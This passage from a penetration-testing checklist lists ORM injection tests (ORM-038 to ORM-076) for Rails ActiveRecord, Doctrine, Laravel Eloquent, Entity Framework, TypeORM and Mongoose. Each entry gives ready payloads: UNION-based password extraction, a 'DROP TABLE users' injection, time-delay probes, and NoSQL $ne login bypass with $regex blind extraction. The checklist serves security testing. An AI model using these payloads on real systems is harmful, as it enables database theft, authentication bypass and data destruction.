**Test Category:** ActiveRecord Injection · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** ActiveRecord group parameter

**Test Steps:** Inject SQL into group() parameter

**Expected Result:** SQL injection via GROUP BY

**Payload Example:**

```
group=name; SELECT 1--
```

**Impact:** Rails ActiveRecord injection: SQL exposure, authN bypass, data theft

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-039 — ActiveRecord - having() Injection
**Test Category:** ActiveRecord Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** ActiveRecord having parameter

**Test Steps:** Inject SQL into having() if string is used instead of hash

**Expected Result:** SQL injection via HAVING clause

**Payload Example:**

```
having=1=1) UNION SELECT password FROM users--
```

**Impact:** Rails ActiveRecord injection: SQL exposure, authN bypass, data theft

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-040 — ActiveRecord - joins() Injection
**Test Category:** ActiveRecord Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** ActiveRecord join parameter

**Test Steps:** Inject SQL into joins() string parameter

**Expected Result:** SQL injection via JOIN clause

**Payload Example:**

```
join=users ON 1=1) UNION SELECT password FROM users--
```

**Impact:** Rails ActiveRecord injection: SQL exposure, authN bypass, data theft

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-041 — ActiveRecord - pluck() Injection
**Test Category:** ActiveRecord Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** ActiveRecord pluck parameter

**Test Steps:** Inject SQL into pluck() if column name from user input

**Expected Result:** Arbitrary column extraction

**Payload Example:**

```
col=password
```

**Impact:** Rails ActiveRecord injection: SQL exposure, authN bypass, data theft

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-042 — ActiveRecord - from() Injection
**Test Category:** ActiveRecord Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** ActiveRecord from parameter

**Test Steps:** Inject SQL into from() parameter

**Expected Result:** Query reads from different table

**Payload Example:**

```
table=(SELECT * FROM admin_users) AS t
```

**Impact:** Rails ActiveRecord injection: SQL exposure, authN bypass, data theft

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-043 — ActiveRecord - calculate() Injection
**Test Category:** ActiveRecord Injection · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** ActiveRecord calculate

**Test Steps:** Inject into calculate/sum/count/average column parameters

**Expected Result:** Aggregation on unintended columns

**Payload Example:**

```
col=password) FROM users--
```

**Impact:** Rails ActiveRecord injection: SQL exposure, authN bypass, data theft

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-044 — ActiveRecord - find_by() Hash Injection
**Test Category:** ActiveRecord Injection · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** ActiveRecord find_by

**Test Steps:** Inject hash keys to include extra conditions

**Expected Result:** Finds records with unintended conditions

**Payload Example:**

```
GET /user?admin=true&id=1
```

**Impact:** Rails ActiveRecord injection: SQL exposure, authN bypass, data theft

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-045 — ActiveRecord - exists?() Injection
**Test Category:** ActiveRecord Injection · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** ActiveRecord exists?

**Test Steps:** Inject SQL into exists?() string parameter

**Expected Result:** Boolean check on injected condition

**Payload Example:**

```
q=') OR 1=1--
```

**Impact:** Rails ActiveRecord injection: SQL exposure, authN bypass, data theft

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-046 — Doctrine - DQL String Concatenation Injection
**Test Category:** Doctrine/DQL Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Doctrine DQL endpoints

**Test Steps:** Inject DQL syntax into parameters concatenated into createQuery() DQL string

**Expected Result:** DQL injection modifies query logic

**Payload Example:**

```
q=' OR 1=1 OR '1'='1
```

**Impact:** DQL injection: object-query manipulation exposing/altering entities

**Tools:** Burp Suite, sqlmap

**References:** CWE-564; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-047 — Doctrine - DQL Boolean Blind Injection
**Test Category:** Doctrine/DQL Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Doctrine DQL endpoints

**Test Steps:** Send true/false DQL conditions and compare responses

**Expected Result:** Response differs based on injected boolean condition

**Payload Example:**

```
q=' AND 1=1 AND '1'='1 vs q=' AND 1=2 AND '1'='1
```

**Impact:** DQL injection: object-query manipulation exposing/altering entities

**Tools:** Burp Intruder

**References:** CWE-564; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-048 — Doctrine - DQL Subquery Injection
**Test Category:** Doctrine/DQL Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Doctrine DQL endpoints

**Test Steps:** Inject DQL subquery to extract data from other entities

**Expected Result:** Subquery data influences response

**Payload Example:**

```
q=' AND (SELECT COUNT(u) FROM App\Entity\User u)>0 AND '1'='1
```

**Impact:** DQL injection: object-query manipulation exposing/altering entities

**Tools:** Burp Suite

**References:** CWE-564; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-049 — Doctrine - createNativeQuery() Injection
**Test Category:** Doctrine/DQL Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Doctrine native query

**Test Steps:** Inject raw SQL into parameters used in createNativeQuery()

**Expected Result:** Full SQL injection

**Payload Example:**

```
q=' UNION SELECT id,username,password FROM users--
```

**Impact:** DQL injection: object-query manipulation exposing/altering entities

**Tools:** sqlmap, Burp Suite

**References:** CWE-564; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-050 — Doctrine - DBAL Connection::executeQuery() Injection
**Test Category:** Doctrine/DQL Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Doctrine DBAL

**Test Steps:** Inject SQL into DBAL executeQuery() with string concatenation

**Expected Result:** Full SQL injection at DBAL level

**Payload Example:**

```
q='; SELECT * FROM users--
```

**Impact:** DQL injection: object-query manipulation exposing/altering entities

**Tools:** sqlmap

**References:** CWE-564; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-051 — Doctrine - QueryBuilder Unsafe Methods
**Test Category:** Doctrine/DQL Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Doctrine QueryBuilder

**Test Steps:** Inject into QueryBuilder-&gt;where() / -&gt;andWhere() with string concat

**Expected Result:** DQL injection via QueryBuilder

**Payload Example:**

```
q=' OR 1=1--
```

**Impact:** DQL injection: object-query manipulation exposing/altering entities

**Tools:** Burp Suite

**References:** CWE-564; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-052 — Doctrine - OrderBy Injection
**Test Category:** Doctrine/DQL Injection · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Doctrine order parameter

**Test Steps:** Inject into addOrderBy() with user-supplied field

**Expected Result:** Arbitrary ordering or error-based extraction

**Payload Example:**

```
sort=u.password DESC,(SELECT 1)
```

**Impact:** DQL injection: object-query manipulation exposing/altering entities

**Tools:** Burp Suite

**References:** CWE-564; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-053 — Eloquent - whereRaw() SQL Injection
**Test Category:** Eloquent/Laravel Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Eloquent search/filter

**Test Steps:** Inject SQL into parameters used in whereRaw() without bindings

**Expected Result:** Full SQL injection in WHERE clause

**Payload Example:**

```
q=' OR 1=1--
```

**Impact:** Eloquent injection: whereRaw/binding abuse; DB read &amp; authN bypass

**Tools:** Burp Suite, sqlmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-054 — Eloquent - orderByRaw() Injection
**Test Category:** Eloquent/Laravel Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Eloquent sort parameter

**Test Steps:** Inject SQL into orderByRaw() parameter

**Expected Result:** SQL injection via ORDER BY

**Payload Example:**

```
sort=name ASC; SELECT pg_sleep(5)--
```

**Impact:** Eloquent injection: whereRaw/binding abuse; DB read &amp; authN bypass

**Tools:** Burp Suite, sqlmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-055 — Eloquent - selectRaw() Injection
**Test Category:** Eloquent/Laravel Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Eloquent select parameter

**Test Steps:** Inject SQL into selectRaw() parameter

**Expected Result:** Arbitrary columns / subqueries selected

**Payload Example:**

```
fields=*,(SELECT password FROM users LIMIT 1) as pw
```

**Impact:** Eloquent injection: whereRaw/binding abuse; DB read &amp; authN bypass

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-056 — Eloquent - groupByRaw() Injection
**Test Category:** Eloquent/Laravel Injection · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Eloquent group parameter

**Test Steps:** Inject SQL into groupByRaw() parameter

**Expected Result:** SQL injection via GROUP BY

**Payload Example:**

```
group=id; SELECT 1--
```

**Impact:** Eloquent injection: whereRaw/binding abuse; DB read &amp; authN bypass

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-057 — Eloquent - havingRaw() Injection
**Test Category:** Eloquent/Laravel Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Eloquent having parameter

**Test Steps:** Inject SQL into havingRaw() parameter

**Expected Result:** SQL injection via HAVING clause

**Payload Example:**

```
having=1=1 UNION SELECT password FROM users--
```

**Impact:** Eloquent injection: whereRaw/binding abuse; DB read &amp; authN bypass

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-058 — Eloquent - DB::raw() Injection
**Test Category:** Eloquent/Laravel Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Eloquent DB::raw

**Test Steps:** Inject SQL into any method using DB::raw() with user input

**Expected Result:** SQL injection via raw expression

**Payload Example:**

```
val=1); SELECT pg_sleep(5)--
```

**Impact:** Eloquent injection: whereRaw/binding abuse; DB read &amp; authN bypass

**Tools:** Burp Suite, sqlmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-059 — Eloquent - JSON Column Injection
**Test Category:** Eloquent/Laravel Injection · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Eloquent JSON where

**Test Steps:** Inject into JSON column queries (-&gt;whereJsonContains / -&gt;where('col-&gt;key'))

**Expected Result:** Unexpected JSON traversal or SQL injection

**Payload Example:**

```
key=password'--&val=test
```

**Impact:** Eloquent injection: whereRaw/binding abuse; DB read &amp; authN bypass

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-060 — Eloquent - Column Name Injection
**Test Category:** Eloquent/Laravel Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Eloquent column parameter

**Test Steps:** Inject SQL via user-controlled column names in where()/orderBy()

**Expected Result:** SQL injection via column reference

**Payload Example:**

```
col=IF(1=1,name,email)
```

**Impact:** Eloquent injection: whereRaw/binding abuse; DB read &amp; authN bypass

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-061 — Eloquent - Conditional Query Chain Injection
**Test Category:** Eloquent/Laravel Injection · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Eloquent when() chains

**Test Steps:** Manipulate boolean conditions to change query chain execution path

**Expected Result:** Unintended query conditions activated

**Payload Example:**

```
status=1&admin=1
```

**Impact:** Eloquent injection: whereRaw/binding abuse; DB read &amp; authN bypass

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-062 — EF - Dynamic LINQ Injection
**Test Category:** Entity Framework Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Entity Framework filter

**Test Steps:** Inject into Dynamic LINQ expressions (System.Linq.Dynamic) if user controls filter strings

**Expected Result:** Arbitrary LINQ expression execution

**Payload Example:**

```
filter=1==1 || true
```

**Impact:** EF injection: LINQ/raw-SQL injection exposing DB

**Tools:** Burp Suite, manual testing

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-063 — EF - FromSqlRaw() Injection
**Test Category:** Entity Framework Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Entity Framework raw SQL

**Test Steps:** Inject SQL into FromSqlRaw() / FromSqlInterpolated() with string concatenation

**Expected Result:** Full SQL injection

**Payload Example:**

```
q=' UNION SELECT * FROM AspNetUsers--
```

**Impact:** EF injection: LINQ/raw-SQL injection exposing DB

**Tools:** Burp Suite, sqlmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-064 — EF - ExecuteSqlRaw() Injection
**Test Category:** Entity Framework Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Entity Framework raw SQL

**Test Steps:** Inject SQL into ExecuteSqlRaw() with string concatenation

**Expected Result:** Full SQL injection (INSERT/UPDATE/DELETE)

**Payload Example:**

```
q='; DROP TABLE users;--
```

**Impact:** EF injection: LINQ/raw-SQL injection exposing DB

**Tools:** sqlmap, Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-065 — EF - String Interpolation vs FormattableString
**Test Category:** Entity Framework Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Entity Framework string interpolation

**Test Steps:** Test if string interpolation goes through parameterized FormattableString or plain string

**Expected Result:** If plain string: SQL injection. If FormattableString: safe.

**Payload Example:**

```
id=1; SELECT @@version--
```

**Impact:** EF injection: LINQ/raw-SQL injection exposing DB

**Tools:** Code review, Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-066 — EF - Injecting into IQueryable.Where() Expression
**Test Category:** Entity Framework Injection · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Entity Framework LINQ

**Test Steps:** If Where() expression is built from user string input (e.g. using expression parser)

**Expected Result:** Unexpected filtering logic

**Payload Example:**

```
filter=Role == "Admin"
```

**Impact:** EF injection: LINQ/raw-SQL injection exposing DB

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-067 — TypeORM - where() String Injection
**Test Category:** TypeORM Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** TypeORM search/filter

**Test Steps:** Inject SQL into .where() when using string syntax with user input

**Expected Result:** SQL injection via WHERE

**Payload Example:**

```
q=' OR 1=1--
```

**Impact:** TypeORM injection: find-options/query-builder injection, DB read

**Tools:** Burp Suite, sqlmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-068 — TypeORM - query() / Raw SQL Injection
**Test Category:** TypeORM Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** TypeORM raw query

**Test Steps:** Inject SQL into manager.query() or queryRunner.query() with string concat

**Expected Result:** Full SQL injection

**Payload Example:**

```
q='; SELECT * FROM user--
```

**Impact:** TypeORM injection: find-options/query-builder injection, DB read

**Tools:** sqlmap, Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-069 — TypeORM - Like Operator Injection
**Test Category:** TypeORM Injection · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** TypeORM like parameter

**Test Steps:** Inject into Like() operator to modify LIKE pattern for blind extraction

**Expected Result:** Blind data extraction via LIKE

**Payload Example:**

```
search=%25admin%25
```

**Impact:** TypeORM injection: find-options/query-builder injection, DB read

**Tools:** Burp Intruder

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-070 — TypeORM - orderBy Injection
**Test Category:** TypeORM Injection · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** TypeORM sort parameter

**Test Steps:** Inject into .orderBy() when column name comes from user input

**Expected Result:** Arbitrary ordering or error-based extraction

**Payload Example:**

```
sort=id,(SELECT 1 FROM user)
```

**Impact:** TypeORM injection: find-options/query-builder injection, DB read

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-071 — TypeORM - FindOptions Object Injection
**Test Category:** TypeORM Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** TypeORM find options

**Test Steps:** Inject into find() options object: where, order, relations, select

**Expected Result:** Unexpected query modification

**Payload Example:**

```
GET /users?where[role]=admin&select[]=password
```

**Impact:** TypeORM injection: find-options/query-builder injection, DB read

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-072 — TypeORM - QueryBuilder .andWhere() Injection
**Test Category:** TypeORM Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** TypeORM QueryBuilder

**Test Steps:** Inject into andWhere() / orWhere() with string concatenation

**Expected Result:** SQL injection via query builder

**Payload Example:**

```
q=' OR '1'='1
```

**Impact:** TypeORM injection: find-options/query-builder injection, DB read

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-073 — Mongoose - NoSQL Auth Bypass ($ne)
**Test Category:** Mongoose/NoSQL ORM · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Mongoose/MongoDB login

**Test Steps:** Send JSON with $ne operator on password field to bypass authentication

**Expected Result:** Login succeeds without valid password

**Payload Example:**

```
{"username":"admin","password":{"$ne":""}}
```

**Impact:** Mongoose/NoSQL ORM operator injection: authN bypass &amp; data exfiltration

**Tools:** Burp Suite, NoSQLMap

**References:** CWE-943; -&gt;[NoSQL Injection checklist](#/checklist/nosqli); PortSwigger Academy; PayloadsAllTheThings NoSQL Injection; OWASP Testing Guide; MongoDB security docs

---

## ORM-074 — Mongoose - $gt Operator Injection
**Test Category:** Mongoose/NoSQL ORM · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Mongoose/MongoDB filter

**Test Steps:** Inject $gt operator to change comparison to greater-than

**Expected Result:** Returns records where field &gt; empty string

**Payload Example:**

```
GET /users?password[$gt]=
```

**Impact:** Mongoose/NoSQL ORM operator injection: authN bypass &amp; data exfiltration

**Tools:** Burp Suite, NoSQLMap

**References:** CWE-943; -&gt;[NoSQL Injection checklist](#/checklist/nosqli); PortSwigger Academy; PayloadsAllTheThings NoSQL Injection; OWASP Testing Guide; MongoDB security docs

---

## ORM-075 — Mongoose - $regex Blind Extraction
**Test Category:** Mongoose/NoSQL ORM · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Mongoose/MongoDB filter

**Test Steps:** Inject $regex operator to extract field values character by character

**Expected Result:** Different responses for matching vs non-matching regex

**Payload Example:**

```
GET /users?password[$regex]=^a (iterate: ^ab, ^ac...)
```

**Impact:** Mongoose/NoSQL ORM operator injection: authN bypass &amp; data exfiltration

**Tools:** Burp Intruder, custom Python script

**References:** CWE-943; -&gt;[NoSQL Injection checklist](#/checklist/nosqli); PortSwigger Academy; PayloadsAllTheThings NoSQL Injection; OWASP Testing Guide; MongoDB security docs

---

## ORM-076 — Mongoose - $where JavaScript Injection
**Test Category:** Mongoose/NoSQL ORM · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Mongoose/MongoDB filter

**Test Steps:** Inject JavaScript code into $where operator

**Expected Result:** Server-side JavaScript execution

